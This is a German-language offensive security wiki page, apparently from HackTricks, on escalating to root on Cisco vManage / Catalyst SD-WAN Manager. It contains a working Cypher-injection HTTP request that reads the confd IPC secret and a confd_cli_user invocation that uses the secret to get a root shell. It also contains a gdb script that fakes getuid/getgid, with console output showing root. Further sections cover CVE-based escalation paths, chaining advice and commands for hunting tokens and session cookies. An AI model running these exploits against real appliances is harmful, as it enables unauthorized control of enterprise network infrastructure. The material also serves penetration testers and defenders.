# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

Sobald du Codeausführung auf Cisco vManage / *Catalyst SD-WAN Manager* als `vmanage`, `netadmin` oder `vmanage-admin` hast, sind die interessantesten lokalen Privesc-Angriffsflächen normalerweise der `confd` CLI-Stack, der `cmdptywrapper`-Helper, localhost REST APIs und root-owned Import-/Upload-Handler.

Wenn du auf einem Controller noch den **initial foothold** brauchst, prüfe zuerst die spezielle Control-Plane-Seite:

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Quick local triage
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
```
Wenn `/etc/confd/confd_ipc_secret` von deinem foothold aus lesbar ist, werden Path 1 und Path 2 sofort praktisch.

## Path 1

(Example from [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

Nach etwas Recherche in der [documentation](http://66.218.245.39/doc/html/rn03re18.html) zu `confd` und den verschiedenen binaries (zugänglich mit einem account auf der Cisco website) haben wir herausgefunden, dass zur Authentifizierung des IPC socket ein secret verwendet wird, das sich in `/etc/confd/confd_ipc_secret` befindet:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Erinnerst du dich an unsere Neo4j-Instanz? Sie läuft unter den Rechten des Benutzers `vmanage`, wodurch wir die Datei mithilfe der vorherigen Schwachstelle abrufen können:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
Das Programm `confd_cli` unterstützt keine Kommandozeilenargumente, ruft aber `/usr/bin/confd_cli_user` mit Argumenten auf. Daher könnten wir direkt `/usr/bin/confd_cli_user` mit unseren eigenen Argumenten aufrufen. Es ist jedoch mit unseren aktuellen Rechten nicht lesbar, also müssen wir es aus dem rootfs holen und per scp kopieren, die Hilfe lesen und es verwenden, um die Shell zu bekommen:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Path 2

(Beispiel aus [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

Der Blog¹ des synacktiv-Teams beschrieb einen eleganten Weg, eine root shell zu erhalten, aber der Haken ist, dass dafür eine Kopie von `/usr/bin/confd_cli_user` benötigt wird, die nur von root lesbar ist. Ich fand einen anderen Weg, um ohne solchen Aufwand zu root zu eskalieren.

Als ich das `/usr/bin/confd_cli` Binary disassemblierte, beobachtete ich Folgendes:

<details>
<summary>Objdump showing UID/GID collection</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

Als ich `ps aux` ausführte, beobachtete ich Folgendes (_beachte `-g 100 -u 107`_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
Ich habe die Hypothese aufgestellt, dass das Programm “confd_cli” die User-ID und Group-ID, die es vom eingeloggten Benutzer gesammelt hat, an die Anwendung “cmdptywrapper” übergibt.

Mein erster Versuch war, “cmdptywrapper” direkt auszuführen und ihm `-g 0 -u 0` zu übergeben, aber es schlug fehl. Es scheint, dass irgendwo auf dem Weg ein File Descriptor (-i 1015) erstellt wurde, und ich kann ihn nicht fälschen.

Wie im Blog von synacktiv erwähnt (letztes Beispiel), unterstützt das Programm “confd_cli” keine Command-line-Argumente, aber ich kann es mit einem Debugger beeinflussen, und glücklicherweise ist GDB auf dem System enthalten.

Ich habe ein GDB-Script erstellt, in dem ich die API `getuid` und `getgid` gezwungen habe, 0 zurückzugeben. Da ich bereits über den Deserialization RCE “vmanage”-Privilege habe, habe ich die Berechtigung, `/etc/confd/confd_ipc_secret` direkt zu lesen.

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
<details>
<summary>Console output</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Pfad 3 (2025 CLI-Input-Validierungsfehler - CVE-2025-20122)

Cisco dokumentierte später in seinem eigenen Advisory für [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt) einen saubereren lokalen Root-Pfad: Ein **authentifizierter Angreifer mit nur Read-Only-Rechten** konnte eine präparierte Anfrage an die Manager-CLI senden und aufgrund unzureichender Input-Validierung zu root springen.

Aus offensiver Sicht ist das die wichtige Erkenntnis:

1. Sobald du *irgendeinen* Low-Priv-Fuß in der Box hast, solltest du den lokalen CLI-Dienst testen, bevor du den schwereren Path 1 / Path 2-Workflow angehst.
2. Nutze die Artefakte aus Path 2 wieder, um die Trust Boundary zu finden: `confd_cli` → `cmdptywrapper` → `vshell`.
3. Behandle jedes Feld, das an das CLI-Backend weitergeleitet wird, als verdächtig: UID/GID, Username, Terminal-Metadaten, importierte Dateien oder jeder Wert, der später von einem root-owned Helper verwendet wird.
4. Wenn ein Low-Priv-User den lokalen CLI-Socket erreichen und diese Felder beeinflussen kann, ist root möglicherweise nur noch eine präparierte Anfrage entfernt.

Ein praktischer Workflow nach dem Landing auf dem Appliance ist:
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
Dies macht den Bug von 2025 zu einem guten Hunting-Muster für ähnliche Versionen: Suche nach **local CLI shims, die Identity in userland sammeln und an einen privilegierteren Wrapper weiterleiten**.

## Path 4 (2026 low-priv REST API to root - CVE-2026-20126)

Ciscos Advisory vom Februar 2026 führte außerdem eine weitere nützliche privesc-Klasse ein: [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v) erlaubte einem **authentifizierten, lokalen Angreifer mit niedrigen Rechten**, root zu erlangen, weil ein unzureichender User-Authentifizierungsmechanismus in der REST API vorhanden war.

Das ist wichtig, weil vManage-privesc nicht mehr nur auf `confd`/TTY-Abuse beschränkt ist. Nach einer low-priv Shell solltest du außerdem nach Folgendem suchen:

- localhost-only API-Endpunkten, die dem Aufrufer zu sehr vertrauen
- Tokens, Cookies oder Service-Credentials, die vom aktuellen Account lesbar sind
- root-only Actions, die über `dataservice`/REST-Handler exponiert sind und lokal trotzdem ausgelöst werden können

In der Praxis ist, sobald du eine Shell als `vmanage` oder ein anderer Service-User hast, lokaler API-Abuse oft leiser und leichter zu automatisieren als interaktiver CLI-Abuse:
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
Wenn die lokale Session-Kontext ausreicht, um privilegierte REST-Funktionalität zu erreichen, bevorzuge den API-Pfad: Er ist einfacher zu replay, zu skripten und mit gestohlenen Web-Sessions oder API-Tokens zu verketten.

## Path 5 (2026 crafted file processed by root - CVE-2026-20245)

Ein weiteres aktuelles Muster ist [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx): Ein lokaler Angreifer mit `netadmin`-Rechten konnte eine **crafted file** hochladen, die die CLI später unsicher verarbeitete, was zu command injection als `root` führte.

Aus Sicht von HackTricks ist die wertvolle Technik breiter als die konkrete CVE:

1. Enumeriere jeden CLI- oder Web-Workflow, der eine Datei akzeptiert: imports, diagnostic bundles, templates, validators, backups, tenant data usw.
2. Verfolge, wo die hochgeladene Datei landet und welches root-owned script oder Binary sie verarbeitet.
3. Teste, ob der Dateiname, der Dateiinhalt oder geparste Metadaten jemals an shell commands, wrapper scripts oder `system()`-artige Helfer übergeben werden.
4. Wenn du bereits `netadmin` erreichen kannst (gültige creds, gestohlene Session oder eine auth-bypass chain), sind file-processing bugs oft der schnellste Weg zu root.

Diese Bug-Klasse lässt sich besonders gut mit remote footholds verketten, die `netadmin`, aber nicht `root` gewähren.

## Other recent vManage/Catalyst SD-WAN Manager vulns to chain

- **Authenticated UI XSS (CVE-2024-20475)** – Stehle eine Admin-Session in der Web-UI und pivot dann in API/CLI-Aktionen, die schließlich `vshell` oder einen der lokalen privesc paths oben erreichen.
- **Remote auth bypass to `netadmin` (CVE-2026-20129)** – Sehr starker Vorläufer für Path 5, weil `netadmin` genau das Level ist, das für die 2026 crafted-file privesc benötigt wird.
- **Authenticated arbitrary file write (CVE-2026-20262)** – Nützlich, um Dateien abzulegen, die später von privilegierten Komponenten geparst werden, oder um operative Artefakte zu überschreiben, die von root-owned Helfern verwendet werden.
- **Pre-auth control-plane auth bypass (CVE-2026-20182)** – Besser dokumentiert auf der dedizierten SD-WAN control-plane page; es kann einen SSH key für `vmanage-admin` anhängen und dir damit den lokalen foothold geben, um diese Seite erneut zu nutzen.

## References

- [Cisco Catalyst SD-WAN Vulnerabilities (CVE-2026-20126, CVE-2026-20129, etc.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager, and Catalyst SD-WAN Validator Authenticated Privilege Escalation Vulnerability (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)

{{#include ../../banners/hacktricks-training.md}}
